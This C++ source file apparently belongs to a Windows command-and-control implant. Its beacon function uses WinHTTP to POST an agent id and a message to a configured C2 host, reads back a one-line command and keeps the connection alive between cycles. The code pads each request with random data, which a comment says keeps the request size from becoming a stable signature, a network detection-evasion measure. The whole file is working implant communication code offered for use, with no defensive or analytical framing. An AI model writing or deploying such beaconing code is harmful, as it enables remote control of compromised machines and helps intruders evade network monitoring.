#include "network.h"
#include "config.h"
#include <windows.h>
#include <winhttp.h>
#include <random>
#include <string>

#pragma comment(lib, "winhttp.lib")

namespace {

// --- JSON ----------------------------------------------------------------

std::string escape_json(const std::string& input) {
	std::string output;
	for (char c : input) {
		switch (c) {
		case '\"': output += "\\\""; break;
		case '\\': output += "\\\\"; break;
		case '\b': output += "\\b";  break;
		case '\f': output += "\\f";  break;
		case '\n': output += "\\n";  break;
		case '\r': output += "\\r";  break;
		case '\t': output += "\\t";  break;
		default:
			if ('\x00' <= c && c <= '\x1f') {
				char buf[7];
				snprintf(buf, sizeof(buf), "\\u%04x", c);
				output += buf;
			}
			else {
				output += c;
			}
		}
	}
	return output;
}

// --- Padding --------------------------------------------------------------
// Random payload tail : the request size must not become a stable signature.

std::string random_padding() {
	static const char alphabet[] =
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	static std::mt19937 rng(std::random_device{}());

	std::uniform_int_distribution<int> length(PadMinBytes, PadMaxBytes);
	std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);

	std::string pad;
	pad.reserve(PadMaxBytes);
	const int size = length(rng);
	for (int i = 0; i < size; ++i) {
		pad += alphabet[pick(rng)];
	}
	return pad;
}

// --- Connexion WinHTTP ----------------------------------------------------
// La connexion HTTP est conservee d'un appel a l'autre : WinHTTP reutilise
// alors la meme socket TCP (keep-alive), au lieu de rouvrir une connexion a
// chaque cycle.
//
// Attention au vocabulaire : le champ "session" est une session WinHTTP
// (contexte client : User-Agent, proxy, timeouts), pas une session shell.

struct HttpConnection {
	HINTERNET session = nullptr;
	HINTERNET server = nullptr;
};

HttpConnection& shared_connection() {
	static HttpConnection http;
	return http;
}

void close_connection(HttpConnection& http) {
	if (http.server) WinHttpCloseHandle(http.server);
	if (http.session) WinHttpCloseHandle(http.session);
	http = HttpConnection{};
}

bool open_connection(HttpConnection& http, unsigned long& error) {
	http.session = WinHttpOpen(UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!http.session) {
		error = GetLastError();
		return false;
	}

	WinHttpSetTimeouts(http.session,
		TimeoutResolveMs, TimeoutConnectMs, TimeoutSendMs, TimeoutReceiveMs);

	http.server = WinHttpConnect(http.session, C2_HOST, C2_PORT, 0);
	if (!http.server) {
		error = GetLastError();
		close_connection(http);
		return false;
	}
	return true;
}

}  // namespace

BeaconReply send_beacon(const std::string& agent_id, const std::string& message) {
	BeaconReply reply;
	HttpConnection& http = shared_connection();

	if (!http.session || !http.server) {
		close_connection(http);
		if (!open_connection(http, reply.error)) {
			reply.result = SendResult::NetworkError;
			return reply;
		}
	}

	HINTERNET request = WinHttpOpenRequest(http.server, L"POST", BeaconPath,
		nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!request) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		return reply;
	}

	const std::string payload =
		"{\"id\":\"" + escape_json(agent_id) +
		"\",\"msg\":\"" + escape_json(message) +
		"\",\"pad\":\"" + random_padding() + "\"}";

	BOOL sent = WinHttpSendRequest(request, L"Content-Type: application/json\r\n", -1L,
		(LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);

	// WinHttpReceiveResponse bloque jusqu'à l'arrivée des en-têtes : c'est ici,
	// et pas dans une boucle de sleep, que s'écoule la tenue côté serveur.
	if (!sent || !WinHttpReceiveResponse(request, nullptr)) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		WinHttpCloseHandle(request);
		close_connection(http);   // la socket est probablement morte
		return reply;
	}

	DWORD status = 0;
	DWORD status_size = sizeof(status);
	if (!WinHttpQueryHeaders(request,
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size, WINHTTP_NO_HEADER_INDEX)) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		WinHttpCloseHandle(request);
		return reply;
	}

	std::string body;
	bool read_ok = true;
	bool connection_ok = true;
	for (;;) {
		DWORD available = 0;
		if (!WinHttpQueryDataAvailable(request, &available)) {
			reply.result = SendResult::NetworkError;
			reply.error = GetLastError();
			read_ok = false;
			connection_ok = false;
			break;
		}
		if (available == 0) break;

		// Une commande tient en une ligne : une reponse plus grosse que la
		// limite est anormale, on refuse plutot que de charger en memoire.
		if (body.size() + available > MaxResponseBytes) {
			reply.result = SendResult::NetworkError;
			reply.error = ERROR_BUFFER_OVERFLOW;
			read_ok = false;
			connection_ok = false;
			break;
		}

		// &chunk[0] plutôt que chunk.data() : data() ne renvoie un char*
		// qu'en C++17, alors que le projet se compile aussi en C++14.
		std::string chunk(available, '\0');
		DWORD read = 0;
		if (!WinHttpReadData(request, &chunk[0], available, &read)) {
			reply.result = SendResult::NetworkError;
			reply.error = GetLastError();
			read_ok = false;
			connection_ok = false;
			break;
		}
		body.append(chunk.data(), read);
	}

	WinHttpCloseHandle(request);

	if (!connection_ok) {
		close_connection(http);   // flux desynchronise : on repart propre
	}

	if (read_ok) {
		if (status == 200) {
			reply.result = SendResult::Ok;
			reply.body = body;
		}
		else {
			reply.result = SendResult::HttpError;
			reply.error = status;
		}
	}
	return reply;
}
